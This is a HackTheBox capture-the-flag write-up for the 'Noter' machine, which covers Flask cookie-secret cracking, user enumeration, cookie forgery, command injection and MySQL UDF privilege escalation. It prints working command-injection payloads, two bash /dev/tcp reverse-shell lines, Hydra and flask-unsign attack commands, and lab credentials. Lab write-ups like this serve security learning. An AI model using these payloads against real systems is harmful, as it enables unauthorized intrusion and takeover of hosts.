---
description: Noter box from HackTheBox write up.
---

# Noter

## Nmap scan

Let's start with a typical all ports scan and then get a more detailed scan for every open port open:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 10.10.11.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 05:32 EDT
Nmap scan report for 10.10.11.160
Host is up (0.055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p21,22,5000 -sC -sV 10.10.11.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 05:34 EDT
Nmap scan report for 10.10.11.160
Host is up (0.051s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds
```

So we have FTP, SSH and a webpage in port 5000. Since both FTP and SSH require credentials we don't have let's start with the port 5000.

## Web application

### Looking around

The web application let the user create notes. After testing some basic SQL injection payloads in the login form I decided to just register and start using the app to see how it works and I noticed something. After creating a note a clicking in the edit button the URL is like this:
```
http://10.10.11.160:5000/edit_note/3
```
This could suggest an IDOR vulnerability but no luck with the fuzzzing, also tried some XSS or SSTI and I got something this time.

Looks like the form is URL encoding the message sent to the server and indicating the data type: `application/x-www-form-urlencoded` but the server is not really checking that the data is actually URL encoded so using Burb suite it is possible to send data without encoding. Something like:
```
<h1>hello</h1>hellohellohellohellohellohellohello
```

Is generating this note:
```
    # hello

hellohellohellohellohellohellohello
```

Looks like it is translating things to Markdown? Anyway, I guess this could lead to some kind of XSS but since the cookie is `HttpOnly` this won't really help.

### Backend tecnology and cookie secret

Looking at the header: `Werkzeug httpd 2.0.2 (Python 3.8.10)` this is probably a Flask server. Using a Flask session encoder/decoder: [https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager){:target="_blank"} I was able to confirm my guess:

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/HTB/Noter/flask-session-cookie-manager]
└─$ python3 flask_session_cookie_manager3.py decode -c eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicmFwdG9yIn0.YpDXsA.rmBkWKEmp_Ona9WwTNCoMNn06lo
b'{"logged_in":true,"username":"raptor"}'
```

We can try to brute force the secret key now. Searching a bit I found this tool: [https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign){:target="_blank"}, let's try it out using Rockyou as wordlist:

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/HTB/Noter]
└─$ flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicmFwdG9yIn0.YpDXsA.rmBkWKEmp_Ona9WwTNCoMNn06lo" --wordlist ~/Wordlists/rockyou.txt --no-literal-eval         
[*] Session decodes to: {'logged_in': True, 'username': 'raptor'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
```
This is our lucky day! We can now forge cookies using the secret key `secret123` (Both of the above tools can do it). Only one thing, we don't really know about other users so I guess we need to figure that out next.

### Enumerating users

After a while I found something. Looks like the login page can be used to leak usernames already registered in the page, the error message is `Invalid credentials` if the user does not exists and `Invalid login` if the user exists but the password is wrong.

Using Hydra to search for valid users I got that there is indeed another user registered in the page (I used a dummy password):

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/HTB/Noter]
└─$ hydra -L /usr/share/wordlists/metasploit/namelist.txt -p 123 10.10.11.160 -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"   
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-27 10:53:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1909 login tries (l:1909/p:1), ~120 tries per task
[DATA] attacking http-post-form://10.10.11.160:5000/login:username=^USER^&password=^PASS^:Invalid credentials
[5000][http-post-form] host: 10.10.11.160   login: blue   password: 123
[5000][http-post-form] host: 10.10.11.160   login: raptor   password: 123
[STATUS] 1572.00 tries/min, 1572 tries in 00:01h, 337 to do in 00:01h, 16 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-27 10:54:27
```

### Forging cookies

Since we found that `blue` is a valid user and also know the cookie secret we should be able to forge a new cookie to login as this user:

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/HTB/Noter]
└─$ flask-unsign --sign --cookie "{'logged_in':True,'username':'blue'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YpDo4w.-__pw4id5OTjiaD9PgwafrOD6Y4
```

Replacing our session cookie for the generated one we are now logged in as `blue`! Looks like its a prenium user and can upload notes, this could be handy later. Also, it is possible to find another username: `ftp_admin` and `blue` credentials for the FTP server: `blue:blue@Noter!`. In the FTP server, I found a PDF file that explain that all the accounts password are generated following this schema: `username@site_name!` and that this default password should be changed.

There is a reminder about changing the admin password in `blue` account so maybe the default password is still in place. I tried to login to the FTP service using `ftp_admin:ftp_admin@Noter!` as credentials and I got access as `ftp_admin`! There are backups of the application so time to analyze the code.

### RCE

The most recent app backup is the one that contains all the application endpoints we saw in the live app. After a while I found something interesting in the `/export_note_remote` endpoint:

```python
# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")

                    ...
```

The application, when exporting a markdown file from the cloud, is not validating the data received at all. It just build a command for Bash that run a javascript program to convert a Markdown file to a PDF.

If the Markdown file contains a payload like this:

```
' || ping -c 2 10.10.14.27 #
```
Bash will execute the ping command as you can see here:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Noter]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:12:02.238973 IP 10.10.11.160 > 10.10.14.27: ICMP echo request, id 5, seq 1, length 64
13:12:02.239002 IP 10.10.14.27 > 10.10.11.160: ICMP echo reply, id 5, seq 1, length 64
13:12:03.239702 IP 10.10.11.160 > 10.10.14.27: ICMP echo request, id 5, seq 2, length 64
13:12:03.239718 IP 10.10.14.27 > 10.10.11.160: ICMP echo reply, id 5, seq 2, length 64
```

Changing a bit the payload we can get a reverse shell!
```
' || bash -i &> /dev/tcp/10.10.14.27/8080 0>&1 #
```

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Noter]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.11.160] 36412
bash: cannot set terminal process group (1261): Inappropriate ioctl for device
bash: no job control in this shell
svc@noter:~/app/web$
```

## In the machine as svc

First of all we can retrieve the MySQL database credentials from the application file:

```python
app.config['MYSQL_USER'] = 'DB_user'
app.config['MYSQL_PASSWORD'] = 'DB_password'
app.config['MYSQL_DB'] = 'app'
```

Also, looking into the old backup I found the credentials for the MySQL root user:
```python
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
```

Using any of the credentials above it is possible to get the `blue` user password hash:
```
$5$rounds=535000$76NyOgtW18b3wIqL$HZqlzNHs1SdzbAb2V6EyAnqYNskA3K.8e1iDesL5vI2
```
Maybe we can try to crack it but for now, let's get the user flag under `/home/svc/user.txt` and create an SSH key pair to get a more stable SSH terminal.

## Getting root

To be honest I spent more time than I'm willing to admit here. First of all, cheking for the user running the MySQL server we can see it is actually `root`:

```bash
svc@noter:~$ cat mysql_service 
● mysql.service - LSB: Start and stop the mysql database server daemon
     Loaded: loaded (/etc/init.d/mysql; generated)
     Active: active (running) since Thu 2022-05-26 11:36:32 UTC; 1 day 8h ago
       Docs: man:systemd-sysv-generator(8)
    Process: 950 ExecStart=/etc/init.d/mysql start (code=exited, status=0/SUCCESS)
      Tasks: 56 (limit: 4617)
     Memory: 270.3M
     CGroup: /system.slice/mysql.service
             ├─1058 /bin/sh /usr/bin/mysqld_safe
             ├─1178 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
             └─1179 logger -t mysqld -p daemon error
```

Since we can have the credentials for the MySQL `root` user we can try to scale using a malicious library. We can use `lib_mysqludf_sys` from Metasploit, in Kali is located here:

```
# The target system is a 64 bits one
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
```

Using Netcat or a simple HTTP server I moved the library to `/home/svc` in the target machine and now we can start with the [trick](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library){:target="_blank"}. Login to MySQL using the `root` user with the credentials found earlier and then we can load the library and get a reverse shell as `root`:

```sql
MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> create table npn(line blob);
Query OK, 0 rows affected (0.005 sec)

# Change PATH if necessary here
MariaDB [mysql]> insert into npn values(load_file('/home/svc/lib_mysqludf_sys.so'));
Query OK, 1 row affected (0.002 sec)

MariaDB [mysql]> select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
Query OK, 1 row affected (0.001 sec)

MariaDB [mysql]> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
Query OK, 0 rows affected (0.001 sec)

# Before executing this command make sure you have Netcat listenner ready!
# Also change this according to your listener IP and port
MariaDB [mysql]> select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.27/8080 0>&1"');
```

After all that a `root` reverse shell arrive to the listener and we can get the final flag under `/root/root.txt`:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.11.160] 38376
bash: cannot set terminal process group (950): Inappropriate ioctl for device
bash: no job control in this shell
root@noter:/var/lib/mysql#
```

If you are having problems getting the library to load, make sure you execute all the commands fast. There is a script in place that reset all changes to the MySQL service and can troll a bit.
